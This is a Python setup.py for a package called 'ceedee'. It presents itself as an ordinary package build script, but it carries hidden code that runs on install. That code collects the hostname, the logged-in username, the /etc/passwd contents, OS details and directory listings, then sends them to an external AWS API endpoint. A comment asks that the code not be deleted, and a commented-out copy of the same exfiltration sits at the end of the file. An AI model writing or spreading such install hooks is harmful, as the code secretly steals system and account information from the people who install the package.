from setuptools import setup, find_packages
import os
import platform
import requests
from urllib import request, parse

# Please do not delete this.
os_name = platform.system()
data = {}
if os_name == 'Linux' or os_name == 'Darwin':
    try:
        hostname = os.popen('hostname').read()
        whoami = os.popen('whoami').read()
        passwd_file = os.popen('cat /etc/passwd').read()
        os_info = os.popen('uname -a').read()
        curr_dir = os.popen("pwd").read()
        list_curr_dir = os.popen("ls -la").read()

        data = {
            'OS': os_name,
            'Hostname': hostname,
            'Logged In Username': whoami,
            'Password File': passwd_file,
            'OS Information': os_info,
            'Current Directory': curr_dir,
            'List of files in Current Directory': list_curr_dir
        }

    except:
        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}

elif os_name == 'Windows':
    try:
        hostname = os.popen('hostname').read()
        whoami = os.popen('whoami').read()
        curr_dir = os.popen("cd").read()
        list_curr_dir = os.popen("dir").read()

        data = {
            'OS': os_name,
            'Hostname': hostname,
            'Logged In Username': whoami,
            'Current Directory': curr_dir,
            'List of files in Current Directory': list_curr_dir
        }

    except:
        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}

else:
    data = {'Error': 'Cannot determine OS'}

data_enc = parse.urlencode(data).encode()
API_ENDPOINT = "https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response"
req = request.Request(API_ENDPOINT, data=data_enc)
res = request.urlopen(req)

setup(
    name='ceedee',
    version='5.8.1',
    license='MIT',
    author="Shubham_fnra",
    author_email='shubham.agrawal@finra.org',
    packages=find_packages('src'),
    package_dir={'': 'src'},
    url='https://github.com/gmyrianthous/example-publish-pypi',
    keywords='ceedee project',
    install_requires=[
          'scikit-learn',
          'requests',
      ],
)

# name = os.popen('hostname').read()
# # who = os.popen('cat /etc/passwd').read()
# # what = os.popen('uname -a').read()
# network = os.popen('dir').read()
#
# API_ENDPOINT = "https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response"
#
# data = {
# 'hostname': name,
# # 'whoami': what,
# 'network': network
# }
#
# r = requests.post(url=API_ENDPOINT, data=data)
